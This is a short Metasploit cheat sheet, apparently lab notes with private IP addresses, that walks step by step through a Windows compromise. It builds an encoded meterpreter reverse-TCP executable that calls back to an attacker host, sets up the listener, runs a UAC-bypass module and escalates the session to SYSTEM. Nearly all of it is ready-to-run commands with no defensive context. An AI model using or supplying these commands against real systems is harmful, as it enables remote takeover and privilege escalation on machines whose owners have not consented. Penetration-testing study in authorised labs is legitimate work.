# Metasploit
```
Attacker 192.168.0.99
Victim   192.168.0.5
```

## Step 1: Create Windows Payload
```
msfvenom -p windows/meterpreter/reverse_tcp -f exe -e cmd/powershell_base64 -i 10 LHOST=192.168.0.99 > blabla.exe
```

## Step 2: Start Listener
```
msf> use exploit/multi/handler
msf> set payload windows/meterpreter/reverse_tcp
msf> set LHOST 192.168.0.99
msf> run
```


## Step 3: Execute blabla.exe on Target
```
metasploit session appears on listsener
```


## Step 4: GetSystem will fail
```
getsystem
```


## Step 5: Privilege Elevation
```
meterpreter> run post/windows/gather/win_privs
meterpreter> getsystem

/* background session and launch UAC bypass
 * 
 * - SESSION must be set to current meterpreter session id
 * - TARGET must be set to 1 for x64 victims
 * - check for open sessions with sessions -l
 */

meterpreter> background
msf> use exploit/windows/local/uacbypass
msf> set session 1
msf> set target 1
msf> set payload windows/meterpreter/reverse_tcp
msf> set lhost 192.168.0.99
msf> run

/* final - get system and show privs */
meterpreter> getsystem
meterpreter> run post/windows/gather/win_privs
```

